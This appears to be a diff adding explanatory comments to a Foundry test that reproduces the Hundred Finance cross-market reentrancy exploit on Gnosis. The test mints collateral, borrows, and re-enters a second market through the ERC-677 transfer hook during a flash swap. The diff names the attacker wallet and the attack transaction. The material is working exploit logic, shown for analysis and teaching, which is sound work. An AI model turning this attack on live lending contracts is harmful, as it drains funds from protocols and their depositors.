@@ -7,6 +7,27 @@ import "./../interface.sol";
 /*
 Root cause: ERC667 tokens hooks reentrancy.
 
+// VULNERABILITY: Compound-style cToken `borrowFresh` calls `doTransferOut(underlying.transfer)` BEFORE writing `accountBorrows[borrower]` and `totalBorrows`. No reentrancy guard protects the window between external call and state update. Because USDC on Gnosis is ERC-677, the transfer calls `recipient.onTokenTransfer(...)` synchronously. The attack contract uses this hook to re-enter a *different* cToken market's `borrow()` while the first borrow's debt is invisible to the Comptroller's liquidity calculation. Cross-market reentrancy succeeds because each market's `nonReentrant` only guards its own contract.
+*/
+ /* Original header lines follow inside comment:
+// VULNERABILITY: Cross-market reentrancy via ERC-677 token transfer callback in cToken borrow before state update
+// Detailed explanation with code references:
+// - In Compound-style CToken (see sources/CEther_090a00/CEther.sol:1956 for borrowInternal, :1978 for borrowFresh, shared logic for CErc20Delegator impls):
+//   borrow() calls borrowInternal() (protected by nonReentrant at :2671) which does accrueInterest then borrowFresh().
+// - borrowFresh (CEther.sol:1978):
+//     1. comptroller.borrowAllowed(this, borrower, amount) -- liquidity calc from Comptroller using *stored* accountBorrows/totalBorrows across markets (see calls at :1980)
+//     2. freshness/cash checks
+//     3. compute vars.accountBorrowsNew, vars.totalBorrowsNew
+//     4. doTransferOut(borrower, borrowAmount)  <--- INTERACTION before EFFECTS  (CEther.sol:2030)
+//        For CErc20: underlying.transfer(to, amount)  [see CErc20Delegator borrow proxy at sources/CErc20Delegator_243E33/CErc20Delegator.sol:604 and note]
+//     5. THEN state write: accountBorrows[borrower] = ... ; totalBorrows = ... (CEther.sol:2033-2035)
+// - Because USDC (0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83) on Gnosis implements ERC-677 (transfer triggers onTokenTransfer), the receiver (attacker) receives synchronous callback.
+// - nonReentrant is *per-cToken* (separate _notEntered state per contract instance: husd vs hxdai), so reentering hXDAI.borrow() from inside hUSDC's transfer is allowed.
+// - Comptroller's borrowAllowed for second market sees mint collateral but not yet the first market's debt (state not committed).
+// - Reference: original Compound issue https://github.com/compound-finance/compound-protocol/issues/141
+// Why it works: violation of Checks-Effects-Interactions + no cross-market reentrancy guard + ERC20 transfer as a reentrancy vector when receiver is attacker-controlled contract.
+// Impact: Attacker borrows from second market without repaying collateral coverage; drains protocol liquidity (in this case ~$7M+ across markets) by double-spending the same collateral position within one tx.
+
 Attacker wallet: 0xd041ad9aae5cf96b21c3ffcb303a0cb80779e358
 Attacker contract: 0xdbf225e3d626ec31f502d435b0f72d82b08e1bdd
 Attack tx: https://gnosisscan.io/tx/0x534b84f657883ddc1b66a314e8b392feb35024afdec61dfe8e7c510cfac1a098
@@ -66,6 +87,13 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
+        // EXPLOIT STEPS:
+        // 1. Flash-swap nearly all USDC liquidity from the wxDAI/USDC Sushi pair (triggers uniswapV2Call).
+        // 2. depositUsdc(): approve + mint() into hUSDC (husd) → receive hUSDC collateral tokens. Collateral now registered in Comptroller.
+        // 3. borrowUsdc(): call hUSDC.borrow(90% of flash). Inside borrowFresh: borrowAllowed passes (collateral present), doTransferOut sends USDC → ERC-677 hook fires onTokenTransfer *before* accountBorrows/totalBorrows are updated.
+        // 4. onTokenTransfer (from non-flash sender) sees xdaiBorrowed==false → calls borrowXdai() on the hXDAI (CEther) market. Comptroller still sees the hUSDC collateral as unencumbered → allows large native XDAI borrow.
+        // 5. Wrap received XDAI, swap on Curve to USDC to repay flash + profit.
+        // 6. Repay flash swap. Debt on hUSDC is finally recorded after the reentrant borrow returns.
         borrow();
         console.log("Attacker Profit: %s usdc", usdc.balanceOf(address(this)) / 1e6);
     }
@@ -102,11 +130,13 @@ contract ContractTest is Test {
     function depositUsdc() internal {
         uint256 balance = usdc.balanceOf(address(this));
         usdc.approve(husd, balance);
+        // EXPLOIT STEPS (prep): Minting hUSDC collateral is the prerequisite. This collateral will be used (under stale view) for the reentrant borrow on the second market.
         ICompoundToken(husd).mint(balance);
     }
 
     function borrowUsdc() internal {
         uint256 amount = (totalBorrowed * 90) / 100;
+        // VULNERABILITY POINT: The hUSDC.borrow call will perform underlying USDC.transfer (via doTransferOut) and then invoke onTokenTransfer on this contract BEFORE the borrow state is written back in the cToken.
         ICompoundToken(husd).borrow(amount);
         console.log("Attacker USDC Balance After Borrow: %s USDC", usdc.balanceOf(address(this)) / 1e6);
         console.log("Hundred USDC Balance After Borrow: %s USDC", usdc.balanceOf(husd) / 1e6);
@@ -116,6 +146,7 @@ contract ContractTest is Test {
         xdaiBorrowed = true;
         uint256 amount = ((totalBorrowed * 1e12) * 60) / 100;
 
+        // EXPLOIT STEPS (cont.): This borrow succeeds only because of the reentrancy window. Comptroller liquidity uses stale (pre-borrow) state from hUSDC.
         ICompoundToken(hxdai).borrow(amount);
         console.log("Attacker xdai Balance After Borrow: %s XDAI", address(this).balance / 1e8);
         console.log("Hundred xdai Balance After Borrow: %s Xdai", address(hxdai).balance / 1e8);
@@ -133,6 +164,9 @@ contract ContractTest is Test {
 
         if (_from != pair && xdaiBorrowed == false) {
             console.log("''i'm in!''");
+            // EXPLOIT STEPS (reentrancy via ERC-677 hook): During the transfer-out of the *first* borrow, this hook is invoked by the token itself.
+            // At this moment the first borrow's effects on accountBorrows/totalBorrows have not been applied.
+            // We immediately borrow against the other market (hXDAI) whose collateral check passes because the debt side-effect is invisible.
             borrowXdai();
         }
     }
